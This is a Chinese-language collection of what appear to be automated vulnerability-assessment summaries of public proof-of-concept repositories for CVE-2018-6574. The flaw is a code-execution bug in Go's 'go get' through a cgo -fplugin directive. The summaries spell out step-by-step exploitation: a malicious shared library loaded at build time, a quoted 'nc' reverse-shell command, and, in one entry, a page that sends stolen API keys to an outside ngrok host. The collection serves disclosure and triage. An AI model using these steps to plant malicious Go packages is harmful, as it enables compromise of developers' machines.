**来源**: [CVE-2018-6574-yavolo_CVE-2018-6574.md](../2018/CVE-2018-6574-yavolo_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 用户使用受影响版本的Go执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 漏洞允许攻击者在用户使用 `go get` 命令下载和构建包含恶意代码的Go包时，执行任意命令。该漏洞是由于 Go 在构建过程中没有正确阻止 `-fplugin=` 和 `-plugin=` 参数传递给 gcc 或 clang 编译器造成的。攻击者可以创建一个包含恶意 C 代码的 Go 包，并利用 `// #cgo CFLAGS:` 指令将恶意代码编译成共享库，然后在构建过程中执行。 

**有效性：** 提供的PoC代码是有效的。其中 `a.c` 文件包含恶意C代码，该代码在编译成动态链接库 (`a.so`) 后，会被 `main.go` 文件中的 `// #cgo CFLAGS: -fplugin=./a.so` 指令加载并在构建过程中执行。`a.c` 中的代码 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 会执行任意系统命令。

**投毒风险：** 此处 `a.c` 中执行 `system("/usr/local/bin/score 6c9d4862-4326-403c-a1c6-47a2ad6fcda5");` 可以视作 PoC的一部分，用于证明漏洞存在，但同时也存在一定的投毒风险。开发者可能隐藏其他恶意代码，例如窃取用户凭据或安装后门。由于`score`命令指向位置未知,可能存在更大的风险.

**利用方式：**

1.  **创建恶意Go包：** 攻击者创建一个包含 `a.c` 和 `main.go` 文件的恶意Go包。
2.  **植入恶意C代码：** 在 `a.c` 文件中编写要执行的恶意C代码。PoC中为执行特定的命令。
3.  **CGO指令：** 在 `main.go` 文件中使用 `// #cgo CFLAGS: -fplugin=./a.so` 指令，指示 Go 编译器在构建过程中加载并执行恶意共享库。
4.  **诱骗用户安装：** 攻击者将恶意Go包上传到公共代码仓库或通过其他方式诱骗用户使用 `go get` 命令下载和构建该包。
5.  **执行恶意代码：** 当用户使用 `go get` 命令构建恶意包时，恶意C代码将被编译成共享库并执行，从而导致远程命令执行。

**项目地址:** [yavolo/CVE-2018-6574](https://github.com/yavolo/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #34

**来源**: [CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md](../2018/CVE-2018-6574-zerbaliy3v_cve-2018-6574-exploit.md)

# CVE-2018-6574

> 📦 该CVE有 **34** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md](../2018/CVE-2018-6574-AshrSec_pentesterlab-CVE-2018-6574.md)

## CVE-2018-6574-Go远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装受影响版本的Go，并且执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞存在于Go语言的`go get`命令中，允许远程命令执行。当使用`go get`构建包含恶意代码的Go项目时，攻击者可以利用gcc或clang插件功能，通过`-fplugin=`或`-plugin=`参数执行任意命令。提供的PoC代码包含一个C文件（`exploit.c`）和一个Go文件（`main.go`）。

`exploit.c` 文件定义了一个在加载时自动执行的 `malicious` 函数。这个函数调用 `system` 函数执行 `/usr/local/bin/score 2c03d8c2-7038-402d-ae28-03a4d2ed9f42` 命令。这个命令是用于上报漏洞利用成功的信息，是测试环境常用的方法。所以这里的投毒风险很低。

`main.go` 文件通过 cgo 技术，允许 Go 代码调用 C 代码。 `#cgo CFLAGS: -fplugin=./exploit.so`  这行代码指示编译器将 `exploit.so` 作为 gcc/clang 插件加载，从而执行 `exploit.c` 中的恶意代码。

利用方式如下：
1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 的Go项目。
2.  攻击者将该项目托管到公共代码仓库。
3.  受害者在安装了受影响Go版本的机器上使用 `go get <攻击者项目>` 命令。
4.  `go get` 在构建项目时，会加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。

结论：该PoC代码有效，可以用于验证CVE-2018-6574漏洞。代码本身没有明显的隐藏投毒代码的迹象。

**项目地址:** [AshrSec/pentesterlab-CVE-2018-6574](https://github.com/AshrSec/pentesterlab-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #2

**来源**: [CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md](../2018/CVE-2018-6574-Cypheer_exploit_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的go版本执行`go get`命令获取恶意模块

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程命令。攻击者可以通过在恶意Go模块中，利用 gcc 或 clang 的 plugin 特性，在构建时执行任意代码。`main.go` 包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，这会指示 go 编译器加载并执行 `exploit.so` 作为插件。如果该`.so`文件包含恶意代码，它将在构建过程中被执行。提供的`CORS.html`文件尝试利用CORS漏洞从`http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys`获取敏感信息，然后将信息发送到攻击者的服务器`https://09ef-186-141-133-245.sa.ngrok.io`。这种组合表明漏洞利用可能涉及到引诱用户下载包含恶意`exploit.so`文件的Go模块，并在构建时执行恶意代码，同时利用CORS漏洞窃取其他域的数据。

**有效性：** `main.go`中的`-fplugin`标志结合`exploit.so`的潜在恶意性，使得该漏洞利用具有有效性。`CORS.html` 的存在表明攻击者可能试图结合利用其他漏洞。

**投毒风险：** 投毒风险为10%。虽然主要的攻击向量看起来是利用`go get`的远程代码执行漏洞，`CORS.html`的存在提出了可能的其他恶意目的。`CORS.html`本身不直接与go编译器或`-fplugin`漏洞相关，因此将其视为完全独立的投毒行为是合理的。 然而，如果恶意作者试图通过其他途径使用该POC，那么使用CORS代码有风险。`main.go`中的核心漏洞利用机制更直接且易于理解。

**利用方式：**

1.  **创建恶意的Go模块：** 攻击者创建一个包含恶意 `exploit.so` 文件的Go模块，该文件将在编译时执行恶意代码。
2.  **利用 `-fplugin` 标志：** 在Go代码中使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，指示编译器加载恶意插件。
3.  **诱导受害者 `go get`：** 攻击者诱骗受害者使用 `go get` 命令获取该恶意模块。
4.  **代码执行：** 当受害者构建恶意模块时，`exploit.so` 中的代码将被执行。
5. **结合CORS攻击 (可选):** CORS.html 是可选的攻击辅助，旨在获取其他域的敏感数据。但这需要目标API存在CORS配置错误。
综上，该漏洞的利用方式是结合了`go get`的远程代码执行漏洞和潜在的CORS漏洞，旨在实现远程代码执行和数据窃取。

**项目地址:** [Cypheer/exploit_CVE-2018-6574](https://github.com/Cypheer/exploit_CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #3

**来源**: [CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-Dannners_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且使用`go get`命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者构建源代码时执行任意命令。漏洞根源在于`go get`命令没有正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的gcc或clang插件。攻击者可以通过创建一个包含恶意插件的Go包，并诱使受害者使用`go get`命令获取该包来触发漏洞。

**有效性：**
根据提供的漏洞信息和搜索引擎结果，该漏洞确实存在，并且有公开的PoC。

**投毒风险：**
提供的PoC代码本身只是一个简单的示例，用于证明漏洞的存在。它通过CGO调用`printf`函数打印一段文字。代码中使用了`-fplugin=./plugin.so`，这意味着需要同时存在一个名为`plugin.so`的恶意插件才能实现远程命令执行。虽然提供的代码本身不包含恶意行为，但是如果攻击者创建一个包含更复杂恶意逻辑的`plugin.so`，则可能造成严重危害。因此，存在一定的投毒风险。

对仓库投毒风险评估：此代码本身无明显风险，风险点在于配套的plugin.so文件，如果plugin.so存在恶意代码，则存在远程代码执行的风险，因为plugin.so不在代码中，需要依赖外部提供，作者可以在plugin.so加入任意代码，风险最高，因此投毒风险为5%。

**利用方式：**
1.  攻击者创建一个包含恶意gcc或clang插件（`plugin.so`）的Go包。
2.  该插件会在编译时执行攻击者预设的命令。
3.  攻击者将该恶意Go包托管在公开的代码仓库（例如GitHub）或私有服务器上。
4.  攻击者诱使受害者使用`go get`命令获取该恶意Go包。
5.  当受害者构建该Go包时，恶意插件会被加载并执行，从而实现远程命令执行。

根据 pentesterlab 网站的描述，通过托管恶意包诱导用户安装是主要的利用方式。

**项目地址:** [Dannners/CVE-2018-6574-go-get-RCE](https://github.com/Dannners/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #4

**来源**: [CVE-2018-6574-NsByte_CVE-2018-6574.md](../2018/CVE-2018-6574-NsByte_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行了 `go get` 命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令在目标系统上执行任意代码。此漏洞源于 Go 在构建源代码期间没有充分阻止 `gcc` 或 `clang` 插件的 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意 `attack.c` 文件和相应的 `main.go` 文件的 Go 包。`attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `__attribute__((constructor))` 标记，使其在共享库加载时自动执行。在这个 POC 中，`malicious()` 函数尝试建立一个反向shell (`nc blablabla`)。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 Go 编译器在构建过程中加载 `attack.so` 共享库。当用户使用易受攻击的 Go 版本执行 `go get` 命令获取此恶意包时，`attack.so` 会被加载，并且 `malicious()` 函数会被执行，从而导致远程命令执行。

**有效性:** 提供的 POC 代码有效，它展示了如何通过 `go get` 和 `gcc` 插件在目标系统上执行任意命令。`attack.c` 文件中的 `system("nc blablabla")` 会尝试建立反向 shell，从而验证了远程代码执行的可能性。

**投毒风险:** 此代码仓库中没有明显的投毒代码。`attack.c` 中执行反向 shell 的代码是漏洞利用的核心部分，而不是隐藏的恶意行为。该利用方式的意图明确，且目的在于利用CVE-2018-6574。

**利用方式:** 攻击者需要创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包，并将其托管在可公开访问的存储库中。然后，诱使目标用户使用易受攻击的 Go 版本执行 `go get` 命令来获取此恶意包。当 `go get` 执行时，Go 编译器会加载 `attack.so` 共享库，并执行其中的恶意代码，从而导致远程命令执行。攻击者可以通过修改 `attack.c` 文件中的命令来执行任意操作，例如安装后门、窃取数据或控制整个系统。

**项目地址:** [NsByte/CVE-2018-6574](https://github.com/NsByte/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #5

**来源**: [CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md](../2018/CVE-2018-6574-Saboor-Hakimi_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令拉取恶意代码

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过构造包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 代码，在受害者使用 `go get` 命令拉取并构建该代码时，利用 gcc 或 clang 插件功能执行任意命令。

**有效性：**
提供的 PoC 代码是有效的。`attack.c` 文件包含一个在程序加载时执行 `system()` 函数的恶意函数，该函数会执行 `/usr/local/bin/score a96ec182-5326-4191-9570-5d5c3fe248a8` 命令。`main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中加载 `attack.so` 插件，从而触发恶意代码的执行。

**投毒风险：**
经过分析，此 PoC 本身并不包含隐藏的投毒代码。`/usr/local/bin/score` 命令的功能未知，但如果该路径指向攻击者控制的服务器，可以构成数据回传或者其他恶意行为。不过单从提供的代码来看，其目的仅仅是利用漏洞触发执行任意命令，而非在代码中植入后门或其他形式的恶意代码。因此，投毒风险评估为 0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `// #cgo CFLAGS: -fplugin=` 指令的 Go 包，并将该包托管在公开的代码仓库中。
2.  受害者使用存在漏洞的 Go 版本执行 `go get` 命令拉取该恶意包。
3.  `go get` 命令会自动构建该包，此时 Go 编译器会加载攻击者指定的恶意插件。
4.  恶意插件中的代码被执行，导致攻击者可以在受害者机器上执行任意命令。

**项目地址:** [Saboor-Hakimi/CVE-2018-6574](https://github.com/Saboor-Hakimi/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #6

**来源**: [CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md](../2018/CVE-2018-6574-YoussefSalama1_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 受害者需要使用存在漏洞的Go版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Go语言的`go get`命令中，由于在编译过程中没有正确过滤`-fplugin`和`-plugin`参数，导致攻击者可以通过构造包含恶意插件的Go代码仓库，诱使受害者使用存在漏洞的Go版本执行`go get`命令时，执行任意命令。

**有效性分析：**
提供的POC代码展示了如何使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定一个插件。当使用存在漏洞的Go版本编译该代码时，`attack.so`会被加载，其中的代码会被执行，从而实现远程代码执行。

**投毒风险分析：**
提供的POC代码本身不包含明显的投毒代码，它的目的是演示漏洞利用。`attack.so`的具体内容需要进一步分析才能确定是否存在恶意代码。根据目前的信息，POC代码的投毒风险评估为0%。`main.go`本身的功能是调用`attack.so`中的函数，并打印返回值。 如果`attack.so`存在后门,执行远程命令,则存在高危风险,但此部分分析应当基于其他辅助文件,本分析只针对`main.go`进行。

**利用方式分析：**
1.  攻击者创建一个包含恶意C代码插件（如`attack.so`）的Go代码仓库。
2.  攻击者在Go源代码中使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定该插件。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行`go get <attacker's repository>`命令。
4.  当Go编译受害者的代码时，会加载并执行`attack.so`中的恶意代码，从而实现远程命令执行。

**项目地址:** [YoussefSalama1/CVE-2018-6574](https://github.com/YoussefSalama1/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #7

**来源**: [CVE-2018-6574-adendarys_CVE-2018-6574.md](../2018/CVE-2018-6574-adendarys_CVE-2018-6574.md)

## CVE-2018-6574-Go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标系统使用受影响的Go版本，并执行 `go get` 命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于 `go get` 命令中，由于未正确过滤 gcc/clang 的 `-fplugin` 和 `-plugin` 参数，攻击者可以通过构造恶意的 Go 包，在构建过程中执行任意命令。提供的POC代码包含一个 C 文件 (`attack.c`)，该文件编译后生成一个动态链接库 (`attack.so`)，其中包含一个 `malicious()` 函数，该函数在动态链接库加载时自动执行，从而执行系统命令 `/usr/local/bin/score 504b8416-d89e-4980-80ff-7cd7d4605752`。Go 代码 (`main.go`) 使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令在编译时加载该动态链接库，从而触发恶意代码的执行。此POC有效，不存在明显的投毒代码，只是利用该漏洞执行预期的恶意行为。

**利用方式：**

1.  攻击者创建一个包含恶意 C 代码（如 `attack.c`）和 Go 代码（如 `main.go`）的 Go 包。
2.  `attack.c` 编译生成一个包含恶意指令的动态库。恶意指令可以是任意系统命令。
3.  Go 代码使用 `#cgo CFLAGS: -fplugin=./attack.so` 引入包含恶意指令的动态库。
4.  攻击者将该 Go 包发布到公共或私有仓库。
5.  受害者使用 `go get` 命令获取该 Go 包。
6.  在构建过程中，Go 编译器会执行 C 编译指令，加载恶意动态链接库，从而执行攻击者预设的恶意命令，导致远程命令执行。

**项目地址:** [adendarys/CVE-2018-6574](https://github.com/adendarys/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #8

**来源**: [CVE-2018-6574-antunesmpedro_CVE-2018-6574.md](../2018/CVE-2018-6574-antunesmpedro_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的 Go 版本执行 `go get` 命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过特制的 Go 代码仓库在目标系统上执行任意命令。当用户使用 `go get` 命令获取包含恶意代码的仓库时，Go 构建系统会执行仓库中嵌入的恶意指令。

**有效性：**

提供的 POC 代码是有效的。`exploit.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行一个命令，在本例中是调用 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，该指令指示 go 编译器将 `exploit.so` 编译为插件，并在程序运行时加载它。因为受影响的 Go 版本没有正确阻止 `-fplugin` 和 `-plugin` 参数，所以这允许执行 `exploit.c` 中的恶意代码。

**投毒风险：**

提供的代码片段本身没有明显的投毒行为。`exploit.c` 执行的命令 `/usr/local/bin/score e105a311-4ea5-435a-89a8-770f2cdd2189`  可能用于完成漏洞利用挑战或者其他目的。该命令不是一个常见的恶意行为，因此不应将其判定为投毒。
整个代码仓库的投毒风险评估为 0%，因为提供的代码段没有任何恶意行为，并且没有迹象表明作者试图隐藏恶意代码。

**利用方式：**

1.  攻击者创建一个包含恶意 `exploit.c` 和 `main.go` 文件的 Go 代码仓库。
2.  `exploit.c` 文件包含需要在目标系统上执行的恶意代码。
3.  `main.go` 文件包含 `#cgo CFLAGS: -fplugin=./exploit.so` 指令，从而利用漏洞。
4.  攻击者诱骗目标用户使用 `go get` 命令获取恶意仓库。
5.  当用户执行 `go get` 命令时，Go 构建系统会编译并加载 `exploit.so` 插件，从而执行 `exploit.c` 中的恶意代码。
6. 目标系统受到攻击，攻击者可以在目标系统上执行任意命令。

**项目地址:** [antunesmpedro/CVE-2018-6574](https://github.com/antunesmpedro/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #9

**来源**: [CVE-2018-6574-bme2003_CVE-2018-6574.md](../2018/CVE-2018-6574-bme2003_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用存在漏洞的Go版本，且执行了`go get`命令获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行任意代码。漏洞原因是 Go 在构建源代码时，没有正确阻止 `-fplugin=` 和 `-plugin=` 参数，攻击者可以利用 gcc 或 clang 的插件功能执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的 Go 包，其中包含一个 `attack.c` 文件和一个 `main.go` 文件。
2.  `attack.c` 文件包含一个 `malicious()` 函数，该函数使用 `system()` 函数执行任意命令。在给定的POC中，执行的命令是`/usr/local/bin/score a10c7b12-8910-4f65-8cd4-a6e57d90686b`。  这个命令很可能是用于提交漏洞利用结果的评分系统。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器将 `attack.c` 编译为共享库 `attack.so`，并将其作为插件加载。
4.  当用户使用 `go get` 命令获取该恶意包时，Go 编译器会自动编译并加载插件，从而执行 `malicious()` 函数中的恶意代码。

**有效性：**

提供的POC代码有效。`main.go`文件中的`// #cgo CFLAGS: -fplugin=./attack.so`指示了利用方式，即通过`go get`拉取代码时，会编译并加载`attack.so`，从而执行预设的恶意代码。

**投毒风险：**

分析POC代码后，没有发现明显的投毒代码。`attack.c` 中的 `system()` 函数执行的命令是明确的，该POC没有包含其他隐藏的恶意行为。因此，投毒风险评估为0%。虽然执行了恶意命令，但这属于漏洞验证所需的操作，不应被视为投毒。


**项目地址:** [bme2003/CVE-2018-6574](https://github.com/bme2003/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #10

**来源**: [CVE-2018-6574-chr1sM_CVE-2018-6574.md](../2018/CVE-2018-6574-chr1sM_CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，允许远程命令执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 使用受影响的Go版本，且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行过程中进行远程命令执行。漏洞原理是由于受影响的Go版本未正确过滤`-fplugin`和`-plugin`参数，攻击者可以构造包含恶意插件的Go项目，当用户使用`go get`获取并构建该项目时，恶意插件会被执行，从而实现远程命令执行。

**有效性评估：**
提供的PoC代码由两部分组成：`attack.c`和`golan.go`。`attack.c`包含一个`malicious()`函数，该函数使用`__attribute__((constructor))`修饰，表明该函数会在程序加载时自动执行。该函数的功能是执行`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`命令。`golan.go` 是一个简单的 Go 程序，它调用 C 代码。通过组合这两个文件，攻击者可以创建一个恶意的 Go 包，当用户使用易受攻击的 `go get` 版本获取该包时，`attack.c` 中的恶意代码将被编译并执行，从而导致命令执行。

**投毒风险评估：**
提供的代码片段中，`attack.c` 执行了一个特定的命令`/usr/local/bin/score 3b9e2681-04f3-4771-b576-05baa2a7523f`，可以判定为漏洞验证代码，目的是为了验证漏洞是否存在。此命令本身可能与漏洞作者相关，但它不属于隐藏的、未公开的恶意行为，可以认为不存在投毒。因此投毒风险为0%。

**利用方式：**
1.  攻击者创建一个恶意的Go项目，其中包含`attack.c`和`golan.go`文件。
2.  `attack.c`包含恶意代码，例如执行任意命令。
3.  在Go项目的构建过程中，通过`-fplugin`或`-plugin`参数指定`attack.c`编译生成的插件。
4.  攻击者将恶意Go项目托管在公开的代码仓库中。
5.  诱导用户使用受影响的Go版本执行`go get`命令获取该恶意Go项目。
6.  当`go get`构建项目时，恶意插件会被加载并执行，从而实现远程命令执行。

**项目地址:** [chr1sM/CVE-2018-6574](https://github.com/chr1sM/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #11

**来源**: [CVE-2018-6574-currently-unkwn_CVE-2018-6574.md](../2018/CVE-2018-6574-currently-unkwn_CVE-2018-6574.md)

## CVE-2018-6574-Golang go get RCE

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Golang

**危害等级:** 高危，允许攻击者在受害者机器上执行任意命令

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 目标使用受影响的Golang版本，并且尝试使用`go get`命令获取包含恶意C代码的项目。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-6574漏洞允许攻击者通过`go get`命令执行远程代码。该漏洞源于Go语言在构建过程中未正确过滤`-fplugin`和`-plugin`参数，导致可以加载恶意的GCC/Clang插件。攻击者可以构造包含恶意C代码的Go项目，当受害者使用`go get`命令获取该项目时，恶意代码会被编译并执行。

**有效性：**

提供的POC代码有效。`main.go`文件通过`// #cgo CFLAGS: -fplugin=./attack.so`指令指定了要加载的插件`attack.so`。`attack.so`文件（未提供，但推测是恶意payload）会被编译并加载，从而执行恶意代码。

**投毒风险：**

代码仓库中可能存在投毒代码的风险，但从给出的`main.go`和`README.md`内容来看，直接的投毒证据并不明显。`main.go`本身只是加载一个插件，恶意代码应该位于`attack.so`中，而这个文件并没有提供。 投毒风险评估为20%是因为攻击者可以将恶意 payload 隐藏在编译后的 `attack.so` 里, 用户下载后编译并不会感知恶意代码的存在, 存在一定风险。

**利用方式：**

1.  攻击者创建一个包含恶意C代码（编译为`.so`文件）的Go项目。
2.  Go项目的源码中，使用`// #cgo CFLAGS: -fplugin=./attack.so`指令指定要加载的恶意插件。
3.  攻击者将该项目托管在公共代码仓库（如GitHub）上。
4.  受害者使用`go get <attacker_repo>`命令尝试获取该项目。
5.  Go在构建项目时，会加载攻击者指定的恶意插件，从而在受害者机器上执行任意代码。
6.  防御措施包括升级到不受影响的Go版本，或配置Go工具链以禁止加载第三方插件。

**项目地址:** [currently-unkwn/CVE-2018-6574](https://github.com/currently-unkwn/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #12

**来源**: [CVE-2018-6574-elw0od_PentesterLab.md](../2018/CVE-2018-6574-elw0od_PentesterLab.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器使用受影响的Go版本，并尝试使用`go get`获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者在 `go get` 命令执行期间利用 gcc 或 clang 插件功能执行远程命令。漏洞原因是 Go 语言未阻止 `-fplugin=` 和 `-plugin=` 参数。提供的POC代码包含一个 `attack.c` 文件，该文件定义了一个名为 `malicious` 的函数，该函数在库加载时自动执行，执行 `/usr/local/bin/score 42689c33-83ff-47d2-b538-ac6931adc5d3` 命令。`main.go` 文件使用 cgo 来编译和链接 `attack.c` 文件，并通过 `#cgo CFLAGS: -fplugin=./attack.so` 指定了 gcc 插件。当执行 `go get` 获取包含此代码的仓库时，`attack.so` 会被编译并加载，导致 `malicious` 函数执行。由于 POC 代码的功能是执行预期的后门命令，因此**没有证据表明存在额外的投毒代码**。POC 的意图是展示漏洞，而不是隐藏恶意行为。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在可公开访问的仓库中。
3.  攻击者诱使用户（开发者）使用受影响的 Go 版本执行 `go get <attacker_repo>` 命令。
4.  当 `go get` 执行时，cgo 编译并链接 `attack.c`，导致 `malicious` 函数执行，从而在目标机器上执行任意命令。


**项目地址:** [elw0od/PentesterLab](https://github.com/elw0od/PentesterLab)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #13

**来源**: [CVE-2018-6574-faiqu3_cve-2018-6574.md](../2018/CVE-2018-6574-faiqu3_cve-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

